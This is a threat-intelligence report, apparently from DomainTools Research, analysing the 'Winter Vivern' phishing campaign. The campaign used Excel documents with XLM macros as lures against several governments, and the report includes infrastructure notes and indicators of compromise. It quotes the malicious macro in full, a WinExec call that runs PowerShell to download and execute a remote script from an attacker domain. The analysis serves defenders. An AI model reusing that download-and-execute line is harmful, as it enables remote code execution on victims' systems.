The simple macro in this document dropped a slightly more complex PowerShell\nscript that performed C2 communications with a domain that has been active since\nDecember 2020 and appeared on no industry-standard blocklists. The most recent domain\nserving documents was registered in April 2021 and DomainTools Research believes other\ndomains used as short term distribution may lead to other documents. The macro and\ndomain mentioned, when hunted on, revealed documents targeting Azerbaijan, Cyprus,\nIndia, Italy, Lithuania, Ukraine, and the Vatican. The DomainTools Research team\ncolloquially refers to this as “Winter Vivern” due to the path used in C2 communication over\nthe last several months.\n\n## Context For Defenders\n\nXLM 4.0 macros, the precursor to VBA in Microsoft Office documents, continue to be a\nproblem as malware authors leverage them to avoid detection. Many times, well crafted\nmacros that span multiple cells and use obfuscation can be used to obscure adversary\n\n\n-----\n\ninfrastructure from virus scanners and other tools. While tooling has come a long way in the\nlast few years that XLM macros have been en vogue, the DomainTools Research team\ncontinues to hunt for new and novel ways that attackers hide domains in these documents.\n\nWe suggest anyone looking into a document containing XLM macros take a look at the\n[excellent XLMMacroDeobfuscator tool to assist in parsing. However, do be aware that there](https://github.com/DissectMalware/XLMMacroDeobfuscator)\n[is currently a bug that breaks deobfuscation when multiple macros are in a single cell. This](https://github.com/DissectMalware/XLMMacroDeobfuscator/issues/80)\nwas the bug the DomainTools Research team was trying to solve while hunting for\ndocuments that failed in this way. As luck would have it the project maintainer already has a\nfix in a testing branch if you as a defender come across this problem in documents you are\nanalyzing.\n\n## The Malicious Document\n\nThe initial Lithuanian-language document, titled vtas_kontaktai_2021_04_20.xls, contains\nthe typical request to enable content if the document is not functioning properly. The\ndocument says it contains the “Contact Details of Municipal Administrations Departments\nfor the Protection of the Rights of the Child”.\n\nThis is a document which the official government of Lithuania provides and can be found on\nGoogle as seen below.\n\n\n-----\n\nHowever, the modified version includes a malicious XLM 4.0 macro that calls out to the\ndomain secure-daddy[.]com. This initial piece follows on all subsequent documents\nmentioned later in this writing as well.\n```\nCALL(\"kernel32\",\"WinExec\",\"JCJ\",\"powershell -c \"\"iex (New-Object\nNet.Webclient).DownloadString( 'https://securedaddy[.]com/wintervivern/server/serverHttpRequest(RUN).txt')\"\"\",0)\n\n```\nWhen executing that string, another PowerShell script is pulled down and run which pulls\ndown one of two scheduled task files depending on the Microsoft Windows version it has\ninfected. These scheduled tasks regularly run the above pull from secure-daddy[.]com so\nthat the script can keep itself updated. The script contains a simple push with all system\ninformation up to the C2, then checks at regular intervals for new commands, presumably\ncapable of dropping another payload.\n\n## Additional Targeting\n\nExamining the origin of the document on VirusTotal we can see that the initial document\ncomes from the URL:\n```\nhttps://securemanag[.]com/data/public/uploads/2017/08/vtas_kontaktai_2021_04_20.xls\n\n```\n\n-----\n\nThis URL also servers up the Azerbaijani-language application-for-visas.xls and a generic\nPeace Institutions contact document in English. All documents contain the PowerShell\nscript mentioned above. When hunting for anything calling out to the secure-daddy[.]com\ndomain we found the Italian-language Rassegna Documentazioni Dicastero per la\nComunicazione.xls (first seen 2021-03-07) and the Cyprus-language document\nΕνημερωμένος κατάλογος.xls (first seen 2021-04-21) which is another set of contactthemed documents. All documents so far have had an author of “Admin” and contained a\nCyrillic code page.\n\n\n-----\n\nSince December 2020, secure-daddy[.]com has also been involved in distributing\ndocuments from two URLs that would suggest earlier targeting of the Indian government\nand the Vatican:\n```\nhttps://securedaddy[.]com/mail.gov.in/iwc_static/c11n/allDomain/Documents/mealib/List%20of%20online\nhttps://secure-daddy[.]com/www.sdsofficium.va/portale/portalesdsext.nsf/\n\n## Attacker Infrastructure\n\n```\nExamining the attacker infrastructure, we found that neither domain was on an industrystandard blocklist, but that DomainTools predictive Risk Scoring algorithms did properly rate\nthem as the highest possible risk for malware.\n\n\n-----\n\nWhile the initial C2 domain secure-daddy[.]com was registered in December 2020, the\nserving domain securemanag[.]com has only been active since April 2021. This indicates to\nus that the adversary is likely starting a new campaign, serving documents from this\naddress and hiding their C2 behind infrastructure they’re reusing from before. Both domains\nare hosted on 3NT Solutions LLP, but are split between the older domain in Sweden and\nthe latest in Estonia.\n\nExamining passive DNS we can see that there has been a decent run of activity on the C2\ndomain so presumably some of these documents have worked and more are out in the wild.\nAdditionally, the SPF record indicates that it accepts mail from a wide range of servers and\nis set up (per the SPF record with ~all) to send mail in transition.\n\nThe newer, document-serving domain has a similar setup but only contains the\nhostinger[.]com portion in its SPF record. However, what is more interesting is that the IP\naddress behind this domain was previously hosting centr-security[.]com. When searched for\nin VirusTotal this reveals another document served up targeting Ukrainian-language\nspeakers from the URL https://centr-security[.]com/mil.gov.ua/documents/stat/statisticsdonbas-07042021.xls.\n\nIt’s important to note that centr-security[.]com has already been placed on a blocklist, but\nthat this domain is spoofing the Council of European National Top-Level Domain Registrars\n(CENTR).\n\n## Conclusion\n\nThis campaign has seemed to have run largely undetected since around December 2020\nwith a wide range of targets and languages. As the scripts are unobfuscated and quite\nsimple, we don’t see this being a complex APT-level campaign as it doesn’t leverage any\nknown tooling. However, we feel it’s always important to note that sophistication is not a\nrequirement to success. Since this cluster of documents can’t be tied to any other\ncampaign, attribution is difficult at this time and DomainTools Research is monitoring this as\nan independent cluster.\n\n\n-----\n\n## IoCs\n\n### File Hashes\n\n**File Name** **Hash**\n\nΕνημερωμένος κατάλογος.xls 94f45ba55420961451afd1b70657375ec64b7697\n\nΕνημερωμένος κατάλογος_NS.xls 2a176721b35543d7f4d9e3d24a7c50e0ea57d7e\n\nvtas_kontaktai_2021_04_20.xls f84044bddbd3e05fac1319c988919492971553bb\n\napplication-for-visa.xls bd1efa4cf3f02cd8723c48deb5f69a432c22f359b9\n\n\nDB%20%20Peace%20Institutions%20(draft).xls\n\n\n00f6291012646213a5aab81153490bb121bbf9c6\n\n\nRassegna Documentazioni Dicastero\nper la Comunicazione.xls\n\n\n638bedcc00c1b1b8a25026b34c29cecc76c050ae\n\n\nserverHttpRequest(RUN).txt c34e98a31246f0903d4742dcf0a9890d5328ba8a\n\n### Domains\n```\ncentr-security[.]com\nsecure-daddy[.]com\nsecuremanage[.]com\n\n IP Addresses\n37[.]252[.]9[.]123\n37[.]252[.]5[.]133\n\n Iris Investigate Hash\nU2FsdGVkX1+/QFMAzMGoRJL1g99F/qbks7NwRHYLPXkMcCCMO1whT0jHrV5fHxs8ZVy3Cc2kvVawfePzqppMh\n\n```\n\n-----",
